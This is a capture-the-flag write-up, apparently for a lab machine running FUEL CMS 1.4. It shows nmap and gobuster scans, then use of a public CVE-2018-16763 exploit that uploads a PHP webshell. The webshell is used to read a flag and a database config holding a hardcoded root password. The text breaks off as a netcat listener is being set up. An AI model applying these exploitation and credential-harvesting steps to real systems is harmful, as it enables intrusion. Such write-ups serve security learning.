<h1 align="center">Challenge 056 - Ignite </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/c8675a0f-1d1e-4e11-a878-116551b26a93" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

Another classical CTF where we probably have to do some web exploitation as a new start-up  has a few issues with their web-server. First things first we do a port scan with nmap

## User.txt

```
root@ip-10-82-89-223:~# nmap -sV -p- -A 10.82.174.145
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-21 05:02 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.82.174.145
Host is up (0.00024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/21%OT=80%CT=1%CU=44260%PV=Y%DS=1%DC=T%G=Y%TM=691FF2
OS:7E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2
OS:301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=6
OS:8DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   0.34 ms 10.82.174.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.03 seconds
```

It seems like only one port is open at the moment. Let's check it out.

<img width="1144" height="768" alt="grafik" src="https://github.com/user-attachments/assets/b8672523-7cb6-4a51-9ce6-496e606699df" />

It seems to be a FUEL CMS website: an open-source, Codeigniter-based content management system for creating websites and web applications. The version running is 1.4. Before checking out if there are any existing exploits for said version we just do some directory enumeration real quick.

```
root@ip-10-82-89-223:~# gobuster dir -u 10.82.174.145 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.174.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.82.174.145/assets/]
/home                 (Status: 200) [Size: 16597]
/index                (Status: 200) [Size: 16597]
/index.php            (Status: 200) [Size: 16597]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Status Code 200 always is a good sign. Let's see what robots.txt hides from us.

<img width="130" height="53" alt="grafik" src="https://github.com/user-attachments/assets/b9350204-706e-4f02-8530-5e4a823fa747" />

It immediately hints at another hidden directory, that may sound promising.

<img width="319" height="261" alt="grafik" src="https://github.com/user-attachments/assets/f923cc16-c05b-44c1-be1a-eb831569be67" />

A login page. That's interesting. Now is a good time to figure out if there are any feasible exploits that we could use for this CMS.

One in particular was especially interesting as it automatically uploads a php webshell API in FuelCMS using CVE-2018-16763. Through the interactive *console.py* we are able to execute commands and download remote files. It will use CVE-2018-16763 php code injection in the filter parameter to upload a php webshell API in FuelCMS using file_put_contents.

We simply clone the github repository for that (https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE) change into the directory and execute the console.py script.

```
root@ip-10-82-89-243:~# git clone https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE.git
Cloning into 'CVE-2018-16763-FuelCMS-1.4.1-RCE'...
remote: Enumerating objects: 23, done.
remote: Counting objects: 100% (23/23), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 23 (delta 4), reused 22 (delta 3), pack-reused 0 (from 0)
Unpacking objects: 100% (23/23), 544.57 KiB | 6.33 MiB/s, done.
root@ip-10-82-89-243:~# cd CVE-2018-16763-FuelCMS-1.4.1-RCE
root@ip-10-82-89-243:~/CVE-2018-16763-FuelCMS-1.4.1-RCE# python3 console.py -t 10.82.174.145
CVE-2018-16763-FuelCMS-1.4.1-RCE - by Remi GASCOU (Podalirius)

[+] Shell was uploaded in http://10.82.174.145/3a37a074c2d44d9583106353383b649e.php
[webshell]> ls /home
www-data
[webshell]> ls /home/www-data
flag.txt
[webshell]> cat /home/www-data/flag.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
## Root.txt
Now we want to escalate privileges as always. One way to do that is by exploiting configuration files, by checking for sensitive information like database credentials or environment variables. Checking the configuration file of a web service is crucial as it helps identify misconfigurations that could lead to security vulnerabilities, performance issues, or service disruptions. That's why we use the find command to figure out where the config file is located.

```
[webshell]> ls /etc
ImageMagick-6
NetworkManager
UPower
X11
acpi
adduser.conf
alternatives
anacrontab
apache2
apg.conf
apm
apparmor
apparmor.d
apport
appstream.conf
apt
aptdaemon
at-spi2
avahi
bash.bashrc
bash_completion
bash_completion.d
bindresvport.blacklist
binfmt.d
bluetooth
brlapi.key
brltty
brltty.conf
ca-certificates
ca-certificates.conf
calendar
chatscripts
compizconfig
console-setup
cracklib
cron.d
cron.daily
cron.hourly
cron.monthly
cron.weekly
crontab
cups
cupshelpers
dbus-1
dconf
debconf.conf
debian_version
default
deluser.conf
depmod.d
dhcp
dictionaries-common
dnsmasq.d
doc-base
dpkg
drirc
emacs
environment
firefox
fonts
fstab
fstab.orig
fuse.conf
fwupd.conf
gai.conf
gconf
gdb
ghostscript
gnome
gnome-app-install
groff
group
group-
grub.d
gshadow
gshadow-
gss
gtk-2.0
gtk-3.0
guest-session
hdparm.conf
host.conf
hostname
hosts
hosts.allow
hosts.deny
hp
ifplugd
iftab
init
init.d
initramfs-tools
inputrc
insserv
insserv.conf
insserv.conf.d
iproute2
issue
issue.net
kbd
kernel
kernel-img.conf
kerneloops.conf
ld.so.cache
ld.so.conf
ld.so.conf.d
ldap
legal
libao.conf
libaudit.conf
libnl-3
libpaper.d
libreoffice
lightdm
lintianrc
locale.alias
locale.gen
localtime
logcheck
login.defs
logrotate.conf
logrotate.d
lsb-release
ltrace.conf
machine-id
magic
magic.mime
mailcap
mailcap.order
manpath.config
mime.types
mke2fs.conf
modprobe.d
modules
modules-load.d
mtab
mtools.conf
mysql
nanorc
network
networks
newt
nsswitch.conf
opt
os-release
pam.conf
pam.d
papersize
passwd
passwd-
pcmcia
perl
php
pki
pm
pnm2ppa.conf
polkit-1
popularity-contest.conf
ppp
profile
profile.d
protocols
pulse
python
python2.7
python3
python3.5
rc.local
rc0.d
rc1.d
rc2.d
rc3.d
rc4.d
rc5.d
rc6.d
rcS.d
resolv.conf
resolvconf
rmt
rpc
rsyslog.conf
rsyslog.d
sane.d
securetty
security
selinux
sensors.d
sensors3.conf
services
sgml
shadow
shadow-
shells
signon-ui
signond.conf
skel
speech-dispatcher
ssh
ssl
subgid
subgid-
subuid
subuid-
sudoers
sudoers.d
sysctl.conf
sysctl.d
systemd
terminfo
thermald
thunderbird
timezone
tmpfiles.d
ucf.conf
udev
udisks2
ufw
update-manager
update-motd.d
update-notifier
updatedb.conf
upstart-xsessions
usb_modeswitch.conf
usb_modeswitch.d
vim
vmware-tools
vtrgb
wgetrc
wpa_supplicant
xdg
xml
zsh_command_not_found
[webshell]> find / -name config 2>/dev/null
/var/www/html/fuel/modules/fuel/views/_generate/advanced/config
/var/www/html/fuel/modules/fuel/libraries/parser/dwoo/Dwoo/Adapters/CodeIgniter/config
/var/www/html/fuel/modules/fuel/assets/docs/fuel_modules_example/config
/var/www/html/fuel/modules/fuel/config
/var/www/html/fuel/application/config
/lib/firmware/carl9170fw/config
/usr/share/yelp/mathjax/config
/usr/share/libreoffice/share/config
/usr/src/linux-headers-4.15.0-45/scripts/config
/usr/src/linux-headers-4.15.0-45/spl/config
/usr/src/linux-headers-4.15.0-45/zfs/config
/usr/src/linux-headers-4.15.0-45-generic/scripts/config
/usr/src/linux-headers-4.15.0-45-generic/include/config
/usr/lib/x86_64-linux-gnu/X11/rstart/config
/usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config
/usr/lib/libreoffice/share/config
/usr/lib/libreoffice/presets/config
/etc/compizconfig/config
/etc/kbd/config
/sys/kernel/config
/sys/devices/pci0000:00/0000:00:1f.0/config
/sys/devices/pci0000:00/0000:00:01.0/config
/sys/devices/pci0000:00/0000:00:04.0/config
/sys/devices/pci0000:00/0000:00:00.0/config
/sys/devices/pci0000:00/0000:00:01.3/config
/sys/devices/pci0000:00/0000:00:03.0/config
/sys/devices/pci0000:00/0000:00:05.0/config
```

The most in line directory that could help us in this case is the config directory for the application */var/www/html/fuel/application/config*. We check out the contents of said directory.

```
[webshell]> ls /var/www/html/fuel/application/config
MY_config.php
MY_fuel.php
MY_fuel_layouts.php
MY_fuel_modules.php
asset.php
autoload.php
config.php
constants.php
custom_fields.php
database.php
doctypes.php
editors.php
environments.php
foreign_chars.php
google.php
hooks.php
index.html
memcached.php
migration.php
mimes.php
model.php
profiler.php
redirects.php
routes.php
smileys.php
social.php
states.php
user_agents.php
```

Just out of interest I want to see if the database.php contains some credentitals we could make use of. Let's cat into the file and see what it contains.

```
[webshell]> cat /var/www/html/fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|	['dsn']      The full DSN string describe a connection to the database.
|	['hostname'] The hostname of your database server.
|	['username'] The username used to connect to the database
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
|	['dbdriver'] The database driver. e.g.: mysqli.
|			Currently supported:
|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|	['dbprefix'] You can add an optional prefix, which will be added
|				 to the table name when using the  Query Builder class
|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|	['cache_on'] TRUE/FALSE - Enables/disables query caching
|	['cachedir'] The path to the folder where cache files should be stored
|	['char_set'] The character set used in communicating with the database
|	['dbcollat'] The character collation used in communicating with the database
|				 NOTE: For MySQL and MySQLi databases, this setting is only used
| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|				 (and in table creation queries made with DB Forge).
| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
| 				 can make your site vulnerable to SQL injection if you are using a
| 				 multi-byte character set and are running versions lower than these.
| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
|	['encrypt']  Whether or not to use an encrypted connection.
|
|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|				'ssl_key'    - Path to the private key file
|				'ssl_cert'   - Path to the public key certificate file
|				'ssl_ca'     - Path to the certificate authority file
|				'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|	['compress'] Whether or not to use client compression (MySQL only)
|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|							- good for ensuring strict SQL while developing
|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
|	['failover'] array - A array with 0 or more data for connections if the main should fail.
|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
| 				NOTE: Disabling this will also effectively disable both
| 				$this->db->last_query() and profiling of DB queries.
| 				When you run a query, with this setting set to TRUE (default),
| 				CodeIgniter will store the SQL statement for debugging purposes.
| 				However, this may cause high memory usage, especially if you run
| 				a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
	@include(TESTER_PATH.'config/tester_database'.EXT);
}
```

Indeed in this instance we can really see the credentials of root with the password itself that is just hardcoded in there. If root didn't change the password we may be able to escalate privileges that way. I first set up a netcat listener as

